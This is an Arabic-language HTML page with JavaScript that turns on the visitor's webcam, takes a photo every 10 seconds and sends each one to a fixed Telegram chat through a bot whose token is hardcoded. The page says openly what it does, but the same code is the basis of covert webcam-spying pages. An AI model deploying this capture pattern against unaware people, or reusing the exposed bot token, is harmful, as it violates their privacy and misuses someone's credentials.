<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>التقاط صور تلقائي وإرسالها إلى تيليجرام</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 450px;
      margin: 20px auto;
      text-align: center;
      background-color: #f9f9f9;
      padding: 15px;
      border-radius: 8px;
      box-shadow: 0 0 10px #ccc;
    }
    video {
      width: 100%;
      max-width: 400px;
      border-radius: 8px;
      background: black;
    }
    #status {
      margin-top: 15px;
      font-weight: bold;
      min-height: 1.2em;
    }
  </style>
</head>
<body>

  <h2>التقاط صور تلقائيًا وإرسالها إلى تيليجرام كل 10 ثواني</h2>

  <video id="video" autoplay playsinline muted></video>
  <div id="status"></div>

  <script>
    const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
    const CHAT_ID = '6036900535';

    const video = document.getElementById('video');
    const statusDiv = document.getElementById('status');

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          statusDiv.textContent = "الكاميرا تعمل الآن، سيتم التقاط صورة كل 10 ثواني.";
          captureAndSendPhoto(); // التقاط الصورة الأولى فور بدء الكاميرا
          setInterval(captureAndSendPhoto, 10000); // التقاط الصورة كل 10 ثواني
        };
      } catch (error) {
        console.error('خطأ في تشغيل الكاميرا:', error);
        statusDiv.textContent = "❌ لم نتمكن من تشغيل الكاميرا. تحقق من السماح للمتصفح.";
      }
    }

    async function captureAndSendPhoto() {
      if (video.readyState < 2) {
        console.warn("⏳ الكاميرا ليست جاهزة بعد");
        return;
      }

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      statusDiv.textContent = "جاري التقاط الصورة وإرسالها...";

      canvas.toBlob(async (blob) => {
        if (!blob) {
          statusDiv.textContent = "❌ حدث خطأ في تجهيز الصورة.";
          return;
        }

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'auto-capture.jpg');

        try {
          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });

          if (response.ok) {
            statusDiv.textContent = "✅ تم إرسال الصورة بنجاح!";
          } else {
            statusDiv.textContent = "❌ فشل في إرسال الصورة. تحقق من التوكن وID.";
            console.error("خطأ في الرد من API:", await response.text());
          }
        } catch (err) {
          statusDiv.textContent = "❌ خطأ في الاتصال بتيليجرام.";
          console.error('خطأ في الإرسال:', err);
        }
      }, 'image/jpeg', 0.95);
    }

    startCamera();
  </script>

</body>
</html>
